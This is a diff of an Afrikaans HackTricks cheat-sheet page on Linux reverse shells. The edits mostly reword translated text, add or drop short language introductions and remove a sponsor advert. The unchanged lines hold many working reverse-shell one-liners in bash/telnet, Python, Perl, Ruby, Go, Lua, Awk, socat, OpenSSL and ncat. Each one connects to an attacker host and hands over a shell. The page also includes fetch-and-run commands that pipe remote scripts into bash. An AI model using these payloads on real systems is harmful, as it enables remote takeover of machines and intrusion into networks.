@@ -6,7 +6,7 @@
 
 Ander maniere om HackTricks te ondersteun:
 
-* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
@@ -57,7 +57,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Voorwaartse Skul
 
-Indien jy 'n **RCE kwesbaarheid** binne 'n Linux-gebaseerde webtoepassing teëkom, kan daar gevalle wees waar **die verkryging van 'n omgekeerde skul moeilik word** as gevolg van die teenwoordigheid van Iptables-reëls of ander filters. In sulke scenarios, oorweeg om 'n PTY skul binne die gekompromitteerde stelsel te skep deur pype te gebruik.
+Indien jy 'n **RCE kwesbaarheid** binne 'n Linux-gebaseerde webtoepassing teëkom, kan daar gevalle wees waar **dit moeilik word om 'n omgekeerde skul te verkry** as gevolg van die teenwoordigheid van Iptables-reëls of ander filters. In sulke scenarios, oorweeg om 'n PTY skul binne die gekompromitteerde stelsel te skep deur pype te gebruik.
 
 Jy kan die kode vind op [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)
 
@@ -67,7 +67,7 @@ Jy hoef net te wysig:
 * Die voorvoegsel en agtervoegsel van jou lading (indien enige)
 * Die manier waarop die lading gestuur word (koppe? data? ekstra inligting?)
 
-Daarna kan jy net **bevele stuur** of selfs die `upgrade` bevel **gebruik om 'n volledige PTY te kry** (let daarop dat pype gelees en geskryf word met 'n benaderde vertraging van 1.3s).
+Daarna kan jy net **bevele stuur** of selfs die `upgrade` bevel **gebruik** om 'n volledige PTY te kry (let daarop dat pype met 'n benaderde vertraging van 1.3s gelees en geskryf word).
 
 ## Netcat
 ```bash
@@ -84,6 +84,8 @@ Kyk dit na op [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
+
+Telnet is 'n oudskool-protokol wat gebruik word om te kommunikeer met 'n bediener deur middel van 'n opdraglynk. Dit kan gebruik word vir eenvoudige skakeling en data-oordrag. Telnet stuur inligting in die oop, sonder enige vorm van kodering, wat dit 'n onveilige opsie maak vir die oordrag van sensitiewe inligting.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -111,8 +113,6 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
 ```
 ## Perl
-
-Perl is 'n kragtige en veelsydige skriptaal wat dikwels gebruik word vir die skryf van skelmskripte. Dit bied 'n wye verskeidenheid van funksies en modules wat dit 'n gewilde keuse maak vir hackers wat verskeie take wil uitvoer binne 'n Linux-omgewing.
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
@@ -123,6 +123,8 @@ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## PHP
+
+PHP is a popular server-side scripting language that is widely used for web development. It can be embedded into HTML and is commonly used to create dynamic web pages. PHP scripts are executed on the server, generating HTML which is then sent to the client's browser. PHP can interact with databases, manage sessions, handle forms, and perform many other tasks to create interactive websites.
 ```php
 // Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
 // Using this method may lead to instances where the connection reaches out to the listener and then closes.
@@ -145,35 +147,11 @@ p.waitFor()
 victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
 attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
-<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Vind kwesbaarhede wat die belangrikste is sodat jy hulle vinniger kan regmaak. Intruder spoor jou aanvalsoppervlak op, hardloop proaktiewe dreigingsskanderings, vind probleme regoor jou hele tegnologie-stapel, van API's tot webtoepassings en wolkstelsels. [**Probeer dit gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) vandag.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
 ## Golang
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 ## Lua
-
-### Inleiding
-
-Lua is 'n kragtige, effektiewe, ligte, en maklik aanpasbare skrips taal wat dikwels gebruik word in die wêreld van sagteware-ontwikkeling. Dit word dikwels gebruik vir die skryf van skrips wat in 'n groter sagtewaretoepassing geïntegreer word om spesifieke funksionaliteit te bied.
-
-### Lua Skulpaal
-
-Lua skulpaal is 'n tegniek wat gebruik word om sagteware te manipuleer deur die insluiting van skadelike kodes in 'n toepassing. Dit kan gebruik word om die sagteware se funksionaliteit te verander, data te steel, of selfs die hele stelsel te kompromiteer.
-
-### Lua Skulpaal Tegnieke
-
-Daar is verskeie tegnieke wat gebruik kan word vir Lua skulpaal, insluitend die insluiting van skadelike kodes in Lua skrips, die manipulasie van bestaande Lua skrips, en die uitbuiting van swakhede in die Lua-uitvoeringsomgewing.
-
-### Beskerming teen Lua Skulpaal
-
-Om jouself teen Lua skulpaal te beskerm, is dit belangrik om te verseker dat jy slegs vertroude Lua-skripte hardloop, om jou sagteware gereeld te opdateer om bekende swakhede te dink, en om sekuriteitsmaatreëls soos toegangsbeheer en data-versleuteling te implementeer.
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -248,12 +226,14 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
 ```
-### Terugkeer skuilplek
+### Terugskulp
 ```bash
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ## Awk
+
+Awk is 'n kragtige patroonherkenningstaal wat dikwels gebruik word vir datamanipulasie en tekstverwerking. Dit kan ook gebruik word vir die skep van skripte en is baie nuttig vir die manipulasie van tekslêers. Awk kan in die terminal gebruik word deur die opdragregel `awk` te tik, gevolg deur die spesifieke sintaksis vir die manipulasie van data.
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
@@ -325,13 +305,13 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 <details>
 
-<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS hakwerk vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Ander maniere om HackTricks te ondersteun:
 
-* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**SUBSKRIPSIEPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag. 
 
